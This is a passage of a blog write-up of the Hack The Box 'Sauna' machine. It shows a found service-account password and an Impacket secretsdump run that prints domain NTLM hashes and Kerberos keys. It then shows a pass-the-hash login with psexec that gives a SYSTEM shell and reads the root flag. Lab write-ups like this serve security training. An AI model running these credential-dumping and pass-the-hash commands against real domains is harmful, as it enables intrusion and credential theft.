+</span></span><span style=display:flex><span>  <span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Looking <span style=color:#66d9ef>for</span> common SAM &amp; SYSTEM backups<span style=color:#f92672>()</span>
+</span></span><span style=display:flex><span>    C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\c</span>onfig<span style=color:#ae81ff>\R</span>egBack<span style=color:#ae81ff>\S</span>AM
+</span></span><span style=display:flex><span>    C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\c</span>onfig<span style=color:#ae81ff>\R</span>egBack<span style=color:#ae81ff>\S</span>YSTEM
+</span></span></code></pre></div><p>We find a potential password for <code>svc_loanmanager</code>: <code>Moneymakestheworldgoround!</code>.<br><code>AppCmd.exe</code> was discovered as well, but none of the techniques seemed to work.<br>There&rsquo;s also a DPAPI Master Key, which we could &lsquo;attack&rsquo; with <a href=https://github.com/gentilkiwi/mimikatz/ title=mimikatz target=_blank rel=noopener>mimikatz</a>.</p><h3 id=hashdump>Hashdump <a href=#hashdump>¶</a></h3><p>Let&rsquo;s try the credentials we found to do a hashdump.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ /opt/impacket/examples/secretsdump.py
+</span></span><span style=display:flex><span>Impacket v0.9.20 - Copyright <span style=color:#ae81ff>2019</span> SecureAuth Corporation
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>usage: secretsdump.py <span style=color:#f92672>[</span>-h<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-debug<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-system SYSTEM<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-bootkey BOOTKEY<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>                      <span style=color:#f92672>[</span>-security SECURITY<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-sam SAM<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-ntds NTDS<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>                      <span style=color:#f92672>[</span>-resumefile RESUMEFILE<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-outputfile OUTPUTFILE<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>                      <span style=color:#f92672>[</span>-use-vss<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-exec-method <span style=color:#f92672>[{</span>smbexec,wmiexec,mmcexec<span style=color:#f92672>}]]</span>
+</span></span><span style=display:flex><span>                      <span style=color:#f92672>[</span>-just-dc-user USERNAME<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-just-dc<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-just-dc-ntlm<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>                      <span style=color:#f92672>[</span>-pwd-last-set<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-user-status<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-history<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>                      <span style=color:#f92672>[</span>-hashes LMHASH:NTHASH<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-no-pass<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-k<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>                      <span style=color:#f92672>[</span>-aesKey hex key<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-dc-ip ip address<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>                      <span style=color:#f92672>[</span>-target-ip ip address<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>                      target
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Performs various techniques to dump secrets from the remote machine without
+</span></span><span style=display:flex><span>executing any agent there.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$ /opt/impacket/examples/secretsdump.py EGOTISTICAL-BANK/svc_loanmgr@10.10.10.175
+</span></span><span style=display:flex><span>Impacket v0.9.20 - Copyright <span style=color:#ae81ff>2019</span> SecureAuth Corporation
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Password:
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>-<span style=color:#f92672>]</span> RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Dumping Domain Credentials <span style=color:#f92672>(</span>domain<span style=color:#ae81ff>\u</span>id:rid:lmhash:nthash<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span><span style=display:flex><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
+</span></span><span style=display:flex><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style=display:flex><span>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+</span></span><span style=display:flex><span>EGOTISTICAL-BANK.LOCAL<span style=color:#ae81ff>\H</span>Smith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+</span></span><span style=display:flex><span>EGOTISTICAL-BANK.LOCAL<span style=color:#ae81ff>\F</span>Smith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+</span></span><span style=display:flex><span>EGOTISTICAL-BANK.LOCAL<span style=color:#ae81ff>\s</span>vc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
+</span></span><span style=display:flex><span>SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:87408da437fc482b3d33f8846565ca96:::
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Kerberos keys grabbed
+</span></span><span style=display:flex><span>Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
+</span></span><span style=display:flex><span>Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0
+</span></span><span style=display:flex><span>Administrator:des-cbc-md5:19d5f15d689b1ce5
+</span></span><span style=display:flex><span>krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
+</span></span><span style=display:flex><span>krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
+</span></span><span style=display:flex><span>krbtgt:des-cbc-md5:c170d5dc3edfc1d9
+</span></span><span style=display:flex><span>EGOTISTICAL-BANK.LOCAL<span style=color:#ae81ff>\H</span>Smith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
+</span></span><span style=display:flex><span>EGOTISTICAL-BANK.LOCAL<span style=color:#ae81ff>\H</span>Smith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
+</span></span><span style=display:flex><span>EGOTISTICAL-BANK.LOCAL<span style=color:#ae81ff>\H</span>Smith:des-cbc-md5:1c73b99168d3f8c7
+</span></span><span style=display:flex><span>EGOTISTICAL-BANK.LOCAL<span style=color:#ae81ff>\F</span>Smith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
+</span></span><span style=display:flex><span>EGOTISTICAL-BANK.LOCAL<span style=color:#ae81ff>\F</span>Smith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
+</span></span><span style=display:flex><span>EGOTISTICAL-BANK.LOCAL<span style=color:#ae81ff>\F</span>Smith:des-cbc-md5:b50e02ab0d85f76b
+</span></span><span style=display:flex><span>EGOTISTICAL-BANK.LOCAL<span style=color:#ae81ff>\s</span>vc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
+</span></span><span style=display:flex><span>EGOTISTICAL-BANK.LOCAL<span style=color:#ae81ff>\s</span>vc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
+</span></span><span style=display:flex><span>EGOTISTICAL-BANK.LOCAL<span style=color:#ae81ff>\s</span>vc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
+</span></span><span style=display:flex><span>SAUNA$:aes256-cts-hmac-sha1-96:60519d04845ef6658c94529aa8fc8220f868f0f4472f49ac8752b04d0ecaecc5
+</span></span><span style=display:flex><span>SAUNA$:aes128-cts-hmac-sha1-96:a3364c8713207d94239da98ecb4483b3
+</span></span><span style=display:flex><span>SAUNA$:des-cbc-md5:104c515b86739e08
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Cleaning up...
+</span></span></code></pre></div><h3 id=pass-the-hash>Pass-the-Hash <a href=#pass-the-hash>¶</a></h3><p>We find a hash for the Administrator account, we can use this in a Pass-the-Hash attack.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>$ /opt/impacket/examples/psexec.py 
+</span></span><span style=display:flex><span>Impacket v0.9.20 - Copyright <span style=color:#ae81ff>2019</span> SecureAuth Corporation
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>usage: psexec.py <span style=color:#f92672>[</span>-h<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-c pathname<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-path PATH<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-file FILE<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-debug<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>                 <span style=color:#f92672>[</span>-hashes LMHASH:NTHASH<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-no-pass<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-k<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-aesKey hex key<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>                 <span style=color:#f92672>[</span>-dc-ip ip address<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>-target-ip ip address<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>                 <span style=color:#f92672>[</span>-port <span style=color:#f92672>[</span>destination port<span style=color:#f92672>]]</span> <span style=color:#f92672>[</span>-service-name service name<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>                 target <span style=color:#f92672>[</span>command <span style=color:#f92672>[</span>command ...<span style=color:#f92672>]]</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PSEXEC like functionality example using RemComSvc.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$ /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff Administrator@10.10.10.175 cmd.exe
+</span></span><span style=display:flex><span>Impacket v0.9.20 - Copyright <span style=color:#ae81ff>2019</span> SecureAuth Corporation
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Requesting shares on 10.10.10.175.....
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Found writable share ADMIN$
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Uploading file KHHXRiQe.exe
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Opening SVCManager on 10.10.10.175.....
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Creating service EnTK on 10.10.10.175.....
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting service EnTK.....
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>!<span style=color:#f92672>]</span> Press help <span style=color:#66d9ef>for</span> extra shell commands
+</span></span><span style=display:flex><span>Microsoft Windows <span style=color:#f92672>[</span>Version 10.0.17763.973<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2018</span> Microsoft Corporation. All rights reserved.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32&gt;whoami
+</span></span><span style=display:flex><span>nt authority<span style=color:#ae81ff>\s</span>ystem
+</span></span></code></pre></div><h3 id=root-flag>Root flag <a href=#root-flag>¶</a></h3><p>TADA</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-bash data-lang=bash><span style=display:flex><span>C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32&gt;type C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\A</span>dministrator<span style=color:#ae81ff>\D</span>esktop<span style=color:#ae81ff>\r</span>oot.txt
+</span></span><span style=display:flex><span>f3ee04965c68257382e31502cc5e881f
+</span></span></code></pre></div></div></article><hr><div class=post-info><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg>
+<span rel=tag class="tag p-category"><a href=https://sequr.be/tags/hackthebox.eu/>HackTheBox.eu</a></span>
+<span rel=tag class="tag p-category"><a href=https://sequr.be/tags/egotisticalsw/>egotisticalSW</a></span>
+<span rel=tag class="tag p-category"><a href=https://sequr.be/tags/machine/>Machine</a></span>
+<span rel=tag class="tag p-category"><a href=https://sequr.be/tags/sauna/>Sauna</a></span></p><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
+<span class=tag><a class=p-category href=https://sequr.be/categories/hack-the-box/>Hack The Box</a></span>
+<span class=tag><a class=p-category href=https://sequr.be/categories/writeup/>Writeup</a></span></p><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6A2 2 0 004 4v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+1230 Words</p><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
+<time class=dt-published datetime=2020-04-21T20:08:57+02:00>2020-04-21
+</time>(Last updated: <time class=dt-updated datetime=2020-07-24T02:00:00+02:00>2020-07-24</time>)</p><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-user"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+<span rel=author class="p-author h-card">DezeStijn</span></p><p><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-link"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<span rel=bookmark class=u-url><a href=https://sequr.be/722135139>https://sequr.be/722135139</a></span></p></div><hr><div class=sharing-buttons><a class=resp-sharing-button__link href=https://ko-fi.com/s4squatch target=_blank rel=noopener aria-label title="Buy me a coffee"><div class="resp-sharing-button resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M23.881 8.948c-.773-4.085-4.859-4.593-4.859-4.593H.723c-.604.0-.679.798-.679.798s-.082 7.324-.022 11.822c.164 2.424 2.586 2.672 2.586 2.672s8.267-.023 11.966-.049c2.438-.426 2.683-2.566 2.658-3.734 4.352.24 7.422-2.831 6.649-6.916zm-11.062 3.511c-1.246 1.453-4.011 3.976-4.011 3.976s-.121.119-.31.023c-.076-.057-.108-.09-.108-.09-.443-.441-3.368-3.049-4.034-3.954-.709-.965-1.041-2.7-.091-3.71.951-1.01 3.005-1.086 4.363.407.0.0 1.565-1.782 3.468-.963 1.904.82 1.832 3.011.723 4.311zm6.173.478c-.928.116-1.682.028-1.682.028V7.284h1.77s1.971.551 1.971 2.638c0 1.913-.985 2.667-2.059 3.015z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fsequr.be%2fblog%2f2020%2f04%2fsauna%2f" target=_blank rel=noopener aria-label title="Share on facebook"><div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fsequr.be%2fblog%2f2020%2f04%2fsauna%2f" target=_blank rel=noopener aria-label title="Share on twitter"><div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg></div></div></a><a class=resp-sharing-button__link href="https://reddit.com/submit/?url=https%3a%2f%2fsequr.be%2fblog%2f2020%2f04%2fsauna%2f&amp;resubmit=true&amp;title=Sauna" target=_blank rel=noopener aria-label title="Share on reddit"><div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012 0zm5.01 4.744c.688.0 1.25.561 1.25 1.249a1.25 1.25.0 01-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968.0 1.754.786 1.754 1.754.0.716-.435 1.333-1.01 1.614a3.111 3.111.0 01.042.52c0 2.694-3.13 4.87-7.004 4.87s-7.004-2.176-7.004-4.87c0-.183.015-.366.043-.534A1.748 1.748.0 014.028 12c0-.968.786-1.754 1.754-1.754.463.0.898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342.0 01.14-.197.35.35.0 01.238-.042l2.906.617a1.214 1.214.0 011.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687.0 1.248-.561 1.248-1.249S9.937 12 9.249 12zm5.5.0c-.687.0-1.248.561-1.248 1.25.0.687.561 1.248 1.249 1.248S16 13.937 16 13.249c0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327.0 00-.231.094.33.33.0 000 .463c.842.842 2.484.913 2.961.913s2.105-.056 2.961-.913a.361.361.0 00.029-.463.33.33.0 00-.464.0c-.547.533-1.684.73-2.512.73-.828.0-1.979-.196-2.512-.73a.326.326.0 00-.232-.095z"/></svg></div></div></a><a class=resp-sharing-button__link href="mailto:?subject=Sauna&amp;body=https%3a%2f%2fsequr.be%2fblog%2f2020%2f04%2fsauna%2f" target=_self rel=noopener aria-label title="Share via email"><div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg></div></div></a></div><div class=pagination><div class=pagination__buttons><span class="button previous"><a href=https://sequr.be/blog/2020/05/openadmin/><span class=button__icon>←</span>
+<span class=button__text>Openadmin</span>
+</a></span><span class="button next"><a href=https://sequr.be/blog/2020/04/installing-folding@home-to-fight-covid-19/><span class=button__text>Installing Folding@home to fight COVID-19</span>
+<span class=button__icon>→</span></a></span></div></div></main></div><footer class="footer h-card"><div class=footer__inner><div class=footer__content><span>&copy; 2019</span>
+<span><a class="p-name u-url" rel=me href=https://sequr.be/>DezeStijn</a></span>
+<span><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/ target=_blank rel=noopener>CC BY-NC-SA 4.0</a></span>
+<span><a href=https://sequr.be/blog/index.xml target=_blank title=rss><svg width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span></div></div></footer></div><script type=text/javascript src=https://sequr.be/bundle.min.e89fda0f29b95d33f6f4224dd9e5cf69d84aff3818be2b0d73e731689cc374261b016d17d46f8381962fb4a1577ba3017b1f23509d894f6e66431f988c00889e.js integrity="sha512-6J/aDym5XTP29CJN2eXPadhK/zgYvisNc+cxaJzDdCYbAW0X1G+DgZYvtKFXe6MBex8jUJ2JT25mQx+YjACIng=="></script></body></html>
